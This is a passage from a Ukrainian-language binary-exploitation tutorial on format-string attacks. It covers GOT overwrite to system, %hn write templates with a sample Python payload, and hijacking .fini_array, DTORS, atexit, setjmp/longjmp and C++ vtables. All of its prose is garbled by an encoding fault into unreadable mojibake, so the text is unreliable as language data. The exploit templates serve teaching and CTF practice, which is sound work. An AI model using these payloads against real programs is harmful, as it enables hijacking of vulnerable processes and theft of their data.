—Å–∏—Å—Ç–µ–º–∏).

–Ø–∫—â–æ **`system`** **–Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è** —Å—Ü–µ–Ω–∞—Ä—ñ—î–º, —Ñ—É–Ω–∫—Ü—ñ—è —Å–∏—Å—Ç–µ–º–∏ **–Ω–µ** –º–∞—Ç–∏–º–µ –∑–∞–ø–∏—Å—É –≤ GOT. –£ —Ü—å–æ–º—É —Å—Ü–µ–Ω–∞—Ä—ñ—ó –≤–∞–º **–¥–æ–≤–µ–¥–µ—Ç—å—Å—è –≤–∏—Ç—ñ–∫–∞—Ç–∏ –∞–¥—Ä–µ—Å—É** —Ñ—É–Ω–∫—Ü—ñ—ó `system` —Å–ø–æ—á–∞—Ç–∫—É.

**Procedure Linkage Table** - —Ü–µ **—Ç–∞–±–ª–∏—Ü—è –ª–∏—à–µ –¥–ª—è —á–∏—Ç–∞–Ω–Ω—è** –≤ —Ñ–∞–π–ª—ñ ELF, —è–∫–∞ –∑–±–µ—Ä—ñ–≥–∞—î –≤—Å—ñ –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ **—Å–∏–º–≤–æ–ª–∏, —è–∫—ñ –ø–æ—Ç—Ä–µ–±—É—é—Ç—å —Ä–æ–∑–≤'—è–∑–∞–Ω–Ω—è**. –ö–æ–ª–∏ –≤–∏–∫–ª–∏–∫–∞—é—Ç—å—Å—è –æ–¥–Ω–∞ –∑ —Ü–∏—Ö —Ñ—É–Ω–∫—Ü—ñ–π, **GOT** –±—É–¥–µ **–ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è—Ç–∏** **–ø–æ—Ç—ñ–∫** –¥–æ **PLT**, —â–æ–± –≤—ñ–Ω –º—ñ–≥ **—Ä–æ–∑–≤'—è–∑–∞—Ç–∏** **–∞–¥—Ä–µ—Å—É** —Ñ—É–Ω–∫—Ü—ñ—ó —Ç–∞ –∑–∞–ø–∏—Å–∞—Ç–∏ —ó—ó –≤ GOT.\
–ü–æ—Ç—ñ–º, **–Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ —Ä–∞–∑—É**, –∫–æ–ª–∏ –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è –≤–∏–∫–ª–∏–∫ –Ω–∞ —Ç—É –∞–¥—Ä–µ—Å—É, **—Ñ—É–Ω–∫—Ü—ñ—è** –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è –±–µ–∑ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ—Å—Ç—ñ —Ä–æ–∑–≤'—è–∑—É–≤–∞—Ç–∏ —ó—ó.

–í–∏ –º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –∞–¥—Ä–µ—Å–∏ PLT –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **`objdump -j .plt -d ./vuln_binary`**

### **–ü–æ—Ç—ñ–∫ –µ–∫—Å–ø–ª–æ–π—Ç—É**

–Ø–∫ –ø–æ—è—Å–Ω–µ–Ω–æ —Ä–∞–Ω—ñ—à–µ, –º–µ—Ç–æ—é –±—É–¥–µ **–ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏** **–∞–¥—Ä–µ—Å—É** —Ñ—É–Ω–∫—Ü—ñ—ó –≤ —Ç–∞–±–ª–∏—Ü—ñ **GOT**, —è–∫–∞ –±—É–¥–µ –≤–∏–∫–ª–∏–∫–∞–Ω–∞ –ø—ñ–∑–Ω—ñ—à–µ. –Ü–¥–µ–∞–ª—å–Ω–æ—é –±—É–ª–æ –± –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ **–∞–¥—Ä–µ—Å—É —à–µ–ª-–∫–æ–¥—É**, —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω—É –≤ –≤–∏–∫–æ–Ω—É–≤–∞–ª—å–Ω–æ–º—É —Ä–æ–∑–¥—ñ–ª—ñ, –∞–ª–µ –π–º–æ–≤—ñ—Ä–Ω–æ –≤–∏ –Ω–µ –∑–º–æ–∂–µ—Ç–µ –Ω–∞–ø–∏—Å–∞—Ç–∏ —à–µ–ª-–∫–æ–¥ –≤ –≤–∏–∫–æ–Ω—É–≤–∞–ª—å–Ω–æ–º—É —Ä–æ–∑–¥—ñ–ª—ñ.\
–¢–æ–º—É —ñ–Ω—à–∞ –æ–ø—Ü—ñ—è - **–ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—é**, —è–∫–∞ **–æ—Ç—Ä–∏–º—É—î** —Å–≤–æ—ó **–∞—Ä–≥—É–º–µ–Ω—Ç–∏** –≤—ñ–¥ **–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞** —Ç–∞ **—Å–ø—Ä—è–º—É–≤–∞—Ç–∏** —ó—ó –Ω–∞ —Ñ—É–Ω–∫—Ü—ñ—é **`system`**.

–î–ª—è –∑–∞–ø–∏—Å—É –∞–¥—Ä–µ—Å–∏, –∑–∞–∑–≤–∏—á–∞–π —Ä–æ–±–ª—è—Ç—å—Å—è 2 –∫—Ä–æ–∫–∏: **—Å–ø–æ—á–∞—Ç–∫—É –∑–∞–ø–∏—Å—É—é—Ç—å—Å—è 2 –±–∞–π—Ç–∏** –∞–¥—Ä–µ—Å–∏, –∞ –ø–æ—Ç—ñ–º —ñ–Ω—à—ñ 2. –î–ª—è —Ü—å–æ–≥–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è **`$hn`**.

**HOB** –≤–∫–∞–∑—É—î –Ω–∞ 2 —Å—Ç–∞—Ä—à–∏—Ö –±–∞–π—Ç–∏ –∞–¥—Ä–µ—Å–∏\
**LOB** –≤–∫–∞–∑—É—î –Ω–∞ 2 –º–æ–ª–æ–¥—à–∏—Ö –±–∞–π—Ç–∏ –∞–¥—Ä–µ—Å–∏

–û—Ç–∂–µ, —á–µ—Ä–µ–∑ —Ç–µ, —è–∫ –ø—Ä–∞—Ü—é—î —Ñ–æ—Ä–º–∞—Ç —Ä—è–¥–∫–∞, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ **—Å–ø–æ—á–∞—Ç–∫—É –∑–∞–ø–∏—Å–∞—Ç–∏ –º–µ–Ω—à–∏–π** –∑ \[HOB, LOB], –∞ –ø–æ—Ç—ñ–º —ñ–Ω—à–∏–π.

–Ø–∫—â–æ HOB < LOB\
`[address+2][address]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

–Ø–∫—â–æ HOB > LOB\
`[address+2][address]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 N¬∫Param\_dir\_HOB LOB\_shell-HOB\_shell N¬∫Param\_dir\_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### **–®–∞–±–ª–æ–Ω –µ–∫—Å–ø–ª–æ–π—Ç—É —Ñ–æ—Ä–º–∞—Ç-—Ä—è–¥–∫–∞**

–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ **—à–∞–±–ª–æ–Ω** –¥–ª—è –µ–∫—Å–ø–ª–æ–π—Ç—É–≤–∞–Ω–Ω—è GOT –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ñ–æ—Ä–º–∞—Ç-—Ä—è–¥–∫—ñ–≤ —Ç—É—Ç:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### **.fini\_array**

–§–∞–∫—Ç–∏—á–Ω–æ —Ü–µ —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ –∑ **—Ñ—É–Ω–∫—Ü—ñ—è–º–∏, —è–∫—ñ –±—É–¥—É—Ç—å –≤–∏–∫–ª–∏–∫–∞–Ω—ñ** –ø–µ—Ä–µ–¥ –∑–∞–≤–µ—Ä—à–µ–Ω–Ω—è–º –ø—Ä–æ–≥—Ä–∞–º–∏. –¶–µ —Ü—ñ–∫–∞–≤–æ, —è–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ —Å–≤—ñ–π **—à–µ–ª-–∫–æ–¥ –ø—Ä–æ—Å—Ç–æ –ø–µ—Ä–µ–π—à–æ–≤—à–∏ –∑–∞ –∞–¥—Ä–µ—Å–æ—é**, –∞–±–æ –≤ —Ç–∏—Ö –≤–∏–ø–∞–¥–∫–∞—Ö, –∫–æ–ª–∏ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –ø–æ–≤–µ—Ä–Ω—É—Ç–∏—Å—è –¥–æ –≥–æ–ª–æ–≤–Ω–æ—ó –∑–Ω–æ–≤—É, —â–æ–± **–µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ —Ñ–æ—Ä–º–∞—Ç–Ω–∏–π —Ä—è–¥–æ–∫ –≤–¥—Ä—É–≥–µ**.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —Ü–µ **–Ω–µ** —Å—Ç–≤–æ—Ä–∏—Ç—å **–≤—ñ—á–Ω–∏–π —Ü–∏–∫–ª**, –æ—Å–∫—ñ–ª—å–∫–∏ –∫–æ–ª–∏ –≤–∏ –ø–æ–≤–µ—Ä–Ω–µ—Ç–µ—Å—è –¥–æ –≥–æ–ª–æ–≤–Ω–æ—ó —Ñ—É–Ω–∫—Ü—ñ—ó, –∫–∞–Ω–∞—Ä–µ–π–∫–∞ –ø–æ–º—ñ—Ç–∏—Ç—å, —â–æ –∫—ñ–Ω–µ—Ü—å —Å—Ç–µ–∫—É –º–æ–∂–µ –±—É—Ç–∏ –ø–æ—à–∫–æ–¥–∂–µ–Ω–∏–π, —ñ —Ñ—É–Ω–∫—Ü—ñ—è –±—ñ–ª—å—à–µ –Ω–µ –±—É–¥–µ –≤–∏–∫–ª–∏–∫–∞–Ω–∞ –∑–Ω–æ–≤—É. –¢–∞–∫–∏–º —á–∏–Ω–æ–º, –≤–∏ –∑–º–æ–∂–µ—Ç–µ **–≤–∏–∫–æ–Ω–∞—Ç–∏ —â–µ 1 —Ä–∞–∑** —É—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å.

### **–§–æ—Ä–º–∞—Ç—É–≤–∞–Ω–Ω—è —Ä—è–¥–∫—ñ–≤ –¥–ª—è –≤–∏–≤–µ–¥–µ–Ω–Ω—è –≤–º—ñ—Å—Ç—É**

–§–æ—Ä–º–∞—Ç–æ–≤–∞–Ω–∏–π —Ä—è–¥–æ–∫ —Ç–∞–∫–æ–∂ –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –¥–ª—è **–≤–∏–≤–µ–¥–µ–Ω–Ω—è –≤–º—ñ—Å—Ç—É** –∑ –ø–∞–º'—è—Ç—ñ –ø—Ä–æ–≥—Ä–∞–º–∏.\
–ù–∞–ø—Ä–∏–∫–ª–∞–¥, —É –Ω–∞—Å—Ç—É–ø–Ω—ñ–π —Å–∏—Ç—É–∞—Ü—ñ—ó —î **–ª–æ–∫–∞–ª—å–Ω–∞ –∑–º—ñ–Ω–Ω–∞ –≤ —Å—Ç–µ—Ü—ñ, —â–æ –≤–∫–∞–∑—É—î –Ω–∞ –ø—Ä–∞–ø–æ—Ä–µ—Ü—å**. –Ø–∫—â–æ –≤–∏ **–∑–Ω–∞–π–¥–µ—Ç–µ**, –¥–µ –≤ **–ø–∞–º'—è—Ç—ñ** –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è **–≤–∫–∞–∑—ñ–≤–Ω–∏–∫** –Ω–∞ **–ø—Ä–∞–ø–æ—Ä–µ—Ü—å**, –≤–∏ –º–æ–∂–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏ **printf –¥–æ—Å—Ç—É–ø** –¥–æ —Ü—ñ—î—ó **–∞–¥—Ä–µ—Å–∏** —Ç–∞ **–≤–∏–≤–µ—Å—Ç–∏** –ø—Ä–∞–ø–æ—Ä–µ—Ü—å:

–û—Ç–∂–µ, –ø—Ä–∞–ø–æ—Ä–µ—Ü—å –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤ **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

–Ü –∑ –≤–∏—Ç–æ–∫—É –≤–∏ –º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏, —â–æ **–≤–∫–∞–∑—ñ–≤–Ω–∏–∫ –Ω–∞ –ø—Ä–∞–ø–æ—Ä–µ—Ü—å** –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤ **8-–º—É** –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ:

![](<../../.gitbook/assets/image (623).png>)

–¢–∞–∫–∏–º —á–∏–Ω–æ–º, **–∑–≤–µ—Ä–Ω—É–≤—à–∏—Å—å –¥–æ 8-–≥–æ –ø–∞—Ä–∞–º–µ—Ç—Ä—É**, –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –ø—Ä–∞–ø–æ—Ä–µ—Ü—å:

![](<../../.gitbook/assets/image (624).png>)

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ, —Å–ª—ñ–¥—É—é—á–∏ –∑–∞ **–ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–º –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è–º** —Ç–∞ —Ä–µ–∞–ª—ñ–∑–∞—Ü—ñ—î—é –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ **–≤–∏—Ç–æ–∫—É –≤–º—ñ—Å—Ç—É**, –≤–∏ –º–æ–∂–µ—Ç–µ **–≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫–∏** –Ω–∞ **`printf`** –¥–æ —Ä–æ–∑–¥—ñ–ª—É, –¥–µ –∑–∞–≤–∞–Ω—Ç–∞–∂—É—î—Ç—å—Å—è **–≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏–π —Ñ–∞–π–ª**, —Ç–∞ **–≤–∏–≤–µ—Å—Ç–∏** –π–æ–≥–æ **–ø–æ–≤–Ω—ñ—Å—Ç—é**!

### **DTOR**

{% hint style="danger" %}
–£ –Ω–∞—à —á–∞—Å –¥—É–∂–µ **–Ω–µ–∑–≤–∏—á–∞–π–Ω–æ –∑–Ω–∞–π—Ç–∏ –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª –∑ —Ä–æ–∑–¥—ñ–ª–æ–º dtor**.
{% endhint %}

–î–µ—Å—Ç—Ä—É–∫—Ç–æ—Ä–∏ - —Ü–µ —Ñ—É–Ω–∫—Ü—ñ—ó, —è–∫—ñ **–≤–∏–∫–æ–Ω—É—é—Ç—å—Å—è –ø–µ—Ä–µ–¥ –∑–∞–≤–µ—Ä—à–µ–Ω–Ω—è–º –ø—Ä–æ–≥—Ä–∞–º–∏**.\
–Ø–∫—â–æ –≤–∏ –∑–º–æ–∂–µ—Ç–µ **–∑–∞–ø–∏—Å–∞—Ç–∏** –∞–¥—Ä–µ—Å—É **shellcode** –≤ **`__DTOR_END__`**, —Ü–µ –±—É–¥–µ **–≤–∏–∫–æ–Ω–∞–Ω–æ** –ø–µ—Ä–µ–¥ –∑–∞–≤–µ—Ä—à–µ–Ω–Ω—è–º –ø—Ä–æ–≥—Ä–∞–º–∏.\
–û—Ç—Ä–∏–º–∞–π—Ç–µ –∞–¥—Ä–µ—Å—É —Ü—å–æ–≥–æ —Ä–æ–∑–¥—ñ–ª—É –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep ‚Äú__DTOR‚Äù
```
–ó–∞–∑–≤–∏—á–∞–π –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ —Ä–æ–∑–¥—ñ–ª **DTOR** **–º—ñ–∂** –∑–Ω–∞—á–µ–Ω–Ω—è–º–∏ `ffffffff` —Ç–∞ `00000000`. –¢–∞–∫ —â–æ, —è–∫—â–æ –≤–∏ –±–∞—á–∏—Ç–µ –ª–∏—à–µ —Ü—ñ –∑–Ω–∞—á–µ–Ω–Ω—è, —Ü–µ –æ–∑–Ω–∞—á–∞—î, —â–æ **–∂–æ–¥–Ω–∞ —Ñ—É–Ω–∫—Ü—ñ—è –Ω–µ –∑–∞—Ä–µ—î—Å—Ç—Ä–æ–≤–∞–Ω–∞**. –¢–æ–º—É **–ø–µ—Ä–µ–∑–∞–ø–∏—à—ñ—Ç—å** **`00000000`** –∞–¥—Ä–µ—Å–æ—é **shellcode**, —â–æ–± –≤–∏–∫–æ–Ω–∞—Ç–∏ –π–æ–≥–æ.

### **–§–æ—Ä–º–∞—Ç—É–≤–∞–Ω–Ω—è —Ä—è–¥–∫—ñ–≤ –¥–ª—è –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è –±—É—Ñ–µ—Ä–∞**

**`sprintf` –ø–µ—Ä–µ–º—ñ—â—É—î** —Ñ–æ—Ä–º–∞—Ç–æ–≤–∞–Ω–∏–π —Ä—è–¥–æ–∫ **—É** **–∑–º—ñ–Ω–Ω—É.** –¢–æ–º—É –≤–∏ –º–æ–∂–µ—Ç–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ **—Ñ–æ—Ä–º–∞—Ç—É–≤–∞–Ω–Ω—è–º —Ä—è–¥–∫–∞**, —â–æ–± –≤–∏–∫–ª–∏–∫–∞—Ç–∏ **–ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è –±—É—Ñ–µ—Ä–∞ –≤ –∑–º—ñ–Ω–Ω—ñ–π**, –∫—É–¥–∏ –∫–æ–ø—ñ—é—î—Ç—å—Å—è –≤–º—ñ—Å—Ç.\
–ù–∞–ø—Ä–∏–∫–ª–∞–¥, –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è `%.44xAAAA` **–∑–∞–ø–∏—à–µ 44 –±–∞–π—Ç–∏ + "AAAA" —É –∑–º—ñ–Ω–Ω—É**, —â–æ –º–æ–∂–µ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è –±—É—Ñ–µ—Ä–∞.

### **–°—Ç—Ä—É–∫—Ç—É—Ä–∏ \_\_atexit**

{% hint style="danger" %}
–°—å–æ–≥–æ–¥–Ω—ñ –¥—É–∂–µ **–Ω–µ–∑–≤–∏—á–∞–π–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü–µ**.
{% endhint %}

**`atexit()`** - —Ü–µ —Ñ—É–Ω–∫—Ü—ñ—è, –¥–æ —è–∫–æ—ó **–ø–µ—Ä–µ–¥–∞—é—Ç—å—Å—è —ñ–Ω—à—ñ —Ñ—É–Ω–∫—Ü—ñ—ó –≤ —è–∫–æ—Å—Ç—ñ –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤.** –¶—ñ **—Ñ—É–Ω–∫—Ü—ñ—ó** –±—É–¥—É—Ç—å **–≤–∏–∫–æ–Ω–∞–Ω—ñ** –ø—Ä–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—ñ **`exit()`** –∞–±–æ **–ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—ñ** –¥–æ **–≥–æ–ª–æ–≤–Ω–æ—ó** —Ñ—É–Ω–∫—Ü—ñ—ó.\
–Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ **–∑–º—ñ–Ω–∏—Ç–∏ –∞–¥—Ä–µ—Å—É** –±—É–¥—å-—è–∫–æ—ó –∑ —Ü–∏—Ö **—Ñ—É–Ω–∫—Ü—ñ–π**, —â–æ–± –≤–∫–∞–∑—É–≤–∞—Ç–∏ –Ω–∞ shellcode, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –≤–∏ **–æ—Ç—Ä–∏–º–∞—î—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å** –Ω–∞–¥ **–ø—Ä–æ—Ü–µ—Å–æ–º**, –∞–ª–µ —Ü–µ –∑–∞—Ä–∞–∑ —Å–∫–ª–∞–¥–Ω—ñ—à–µ.\
–ù–∞—Ä–∞–∑—ñ **–∞–¥—Ä–µ—Å–∏ —Ñ—É–Ω–∫—Ü—ñ–π**, —è–∫—ñ –º–∞—é—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ–Ω–∞–Ω—ñ, **–ø—Ä–∏—Ö–æ–≤–∞–Ω—ñ** –∑–∞ –∫—ñ–ª—å–∫–æ–º–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä–∞–º–∏, —ñ, –Ω–∞—Ä–µ—à—Ç—ñ, –∞–¥—Ä–µ—Å–∏, –Ω–∞ —è–∫—ñ –≤–æ–Ω–∏ –≤–∫–∞–∑—É—é—Ç—å, –Ω–µ —î –∞–¥—Ä–µ—Å–∞–º–∏ —Ñ—É–Ω–∫—Ü—ñ–π, –∞ **—à–∏—Ñ—Ä—É—é—Ç—å—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é XOR** —Ç–∞ –∑—Å—É–≤—ñ–≤ –∑ **–≤–∏–ø–∞–¥–∫–æ–≤–∏–º –∫–ª—é—á–µ–º**. –¢–æ–º—É –Ω–∞—Ä–∞–∑—ñ —Ü–µ–π –≤–µ–∫—Ç–æ—Ä –∞—Ç–∞–∫–∏ **–Ω–µ –¥—É–∂–µ –∫–æ—Ä–∏—Å–Ω–∏–π –ø—Ä–∏–Ω–∞–π–º–Ω—ñ –Ω–∞ x86** —Ç–∞ **x64\_86**.\
–§—É–Ω–∫—Ü—ñ—è **—à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è** - **`PTR_MANGLE`**. **–Ü–Ω—à—ñ –∞—Ä—Ö—ñ—Ç–µ–∫—Ç—É—Ä–∏**, —Ç–∞–∫—ñ —è–∫ m68k, mips32, mips64, aarch64, arm, hppa... **–Ω–µ —Ä–µ–∞–ª—ñ–∑—É—é—Ç—å —Ñ—É–Ω–∫—Ü—ñ—é —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è**, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–æ–Ω–∞ **–ø–æ–≤–µ—Ä—Ç–∞—î —Ç–µ –∂**, —â–æ –æ—Ç—Ä–∏–º–∞–ª–∞ –Ω–∞ –≤—Ö–æ–¥—ñ. –¢–æ–º—É —Ü—ñ –∞—Ä—Ö—ñ—Ç–µ–∫—Ç—É—Ä–∏ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –ø—ñ–¥–¥–∞–Ω—ñ –∞—Ç–∞–∫–∞–º —á–µ—Ä–µ–∑ —Ü–µ–π –≤–µ–∫—Ç–æ—Ä.

### **setjmp() & longjmp()**

{% hint style="danger" %}
–°—å–æ–≥–æ–¥–Ω—ñ –¥—É–∂–µ **–Ω–µ–∑–≤–∏—á–∞–π–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü–µ**.
{% endhint %}

**`Setjmp()`** –¥–æ–∑–≤–æ–ª—è—î **–∑–±–µ—Ä–µ–≥—Ç–∏** **–∫–æ–Ω—Ç–µ–∫—Å—Ç** (—Ä–µ–≥—ñ—Å—Ç—Ä–∏)\
**`longjmp()`** –¥–æ–∑–≤–æ–ª—è—î **–≤—ñ–¥–Ω–æ–≤–∏—Ç–∏** **–∫–æ–Ω—Ç–µ–∫—Å—Ç**.\
–ó–±–µ—Ä–µ–∂–µ–Ω—ñ —Ä–µ–≥—ñ—Å—Ç—Ä–∏: `EBX, ESI, EDI, ESP, EIP, EBP`\
–°–ø—Ä–∞–≤–∞ –≤ —Ç–æ–º—É, —â–æ EIP —Ç–∞ ESP –ø–µ—Ä–µ–¥–∞—é—Ç—å—Å—è —Ñ—É–Ω–∫—Ü—ñ—î—é **`PTR_MANGLE`**, —Ç–æ–º—É **–∞—Ä—Ö—ñ—Ç–µ–∫—Ç—É—Ä–∞, —è–∫–∞ –≤—Ä–∞–∑–ª–∏–≤–∞ –Ω–∞ —Ü—é –∞—Ç–∞–∫—É, —Ç–∞–∫–∞ –∂, —è–∫ –≤–∏—â–µ**.\
–í–æ–Ω–∏ –∫–æ—Ä–∏—Å–Ω—ñ –¥–ª—è –≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è –ø–æ–º–∏–ª–æ–∫ –∞–±–æ –ø–µ—Ä–µ—Ä–∏–≤–∞–Ω—å.\
–û–¥–Ω–∞–∫, –∑ —Ç–æ–≥–æ, —â–æ —è –ø—Ä–æ—á–∏—Ç–∞–≤, —ñ–Ω—à—ñ —Ä–µ–≥—ñ—Å—Ç—Ä–∏ –Ω–µ –∑–∞—Ö–∏—â–µ–Ω—ñ, **—Ç–æ–º—É —è–∫—â–æ —î `call ebx`, `call esi` –∞–±–æ `call edi`** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ—ó, —è–∫–∞ –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è, –º–æ–∂–Ω–∞ –∑–∞—Ö–æ–ø–∏—Ç–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å. –ê–±–æ –≤–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –∑–º—ñ–Ω–∏—Ç–∏ EBP –¥–ª—è –∑–º—ñ–Ω–∏ ESP.

**VTable —Ç–∞ VPTR —É C++**

–ö–æ–∂–µ–Ω –∫–ª–∞—Å –º–∞—î **Vtable**, —è–∫–∏–π —î –º–∞—Å–∏–≤–æ–º **–≤–∫–∞–∑—ñ–≤–Ω–∏–∫—ñ–≤ –Ω–∞ –º–µ—Ç–æ–¥–∏**.

–ö–æ–∂–µ–Ω –æ–±'—î–∫—Ç **–∫–ª–∞—Å—É** –º–∞—î **VPtr**, —è–∫–∏–π —î **–≤–∫–∞–∑—ñ–≤–Ω–∏–∫–æ–º** –Ω–∞ –º–∞—Å–∏–≤ —Å–≤–æ–≥–æ –∫–ª–∞—Å—É. VPtr —î —á–∞—Å—Ç–∏–Ω–æ—é –∑–∞–≥–æ–ª–æ–≤–∫–∞ –∫–æ–∂–Ω–æ–≥–æ –æ–±'—î–∫—Ç–∞, —Ç–æ–º—É —è–∫—â–æ –¥–æ—Å—è–≥–Ω—É—Ç–æ **–ø–µ—Ä–µ–ø–∏—Å—É–≤–∞–Ω–Ω—è** VPtr, –π–æ–≥–æ –º–æ–∂–Ω–∞ **–∑–º—ñ–Ω–∏—Ç–∏**, —â–æ–± –≤–∫–∞–∑—É–≤–∞—Ç–∏ –Ω–∞ —Ñ—ñ–∫—Ç–∏–≤–Ω–∏–π –º–µ—Ç–æ–¥, —Ç–∞–∫ —â–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Ñ—É–Ω–∫—Ü—ñ—ó –ø–µ—Ä–µ–π–¥–µ –¥–æ shellcode.

## **–ó–∞—Ö–æ–¥–∏ –∑–∞–ø–æ–±—ñ–≥–∞–Ω–Ω—è —Ç–∞ —É—Ö–∏–ª–µ–Ω–Ω—è**

**Return-into-printf**

–¶–µ —Ç–µ—Ö–Ω—ñ–∫–∞ –ø–µ—Ä–µ—Ç–≤–æ—Ä–µ–Ω–Ω—è –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è –±—É—Ñ–µ—Ä–∞ –Ω–∞ –ø–æ–º–∏–ª–∫—É —Ñ–æ—Ä–º–∞—Ç—É —Ä—è–¥–∫–∞. –ü–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ –∑–∞–º—ñ–Ω—é—î–º–æ EIP, —â–æ–± –≤—ñ–Ω –≤–∫–∞–∑—É–≤–∞–≤ –Ω–∞ printf —Ñ—É–Ω–∫—Ü—ñ—é —Ç–∞ –ø–µ—Ä–µ–¥–∞—î–º–æ —ó–π —è–∫ –∞—Ä–≥—É–º–µ–Ω—Ç –∑–º—ñ–Ω–µ–Ω–∏–π —Ä—è–¥–æ–∫ —Ñ–æ—Ä–º–∞—Ç—É, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ –∑–Ω–∞—á–µ–Ω–Ω—è –ø—Ä–æ —Å—Ç–∞–Ω –ø—Ä–æ—Ü–µ—Å—É.

**–ê—Ç–∞–∫–∞ –Ω–∞ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏**

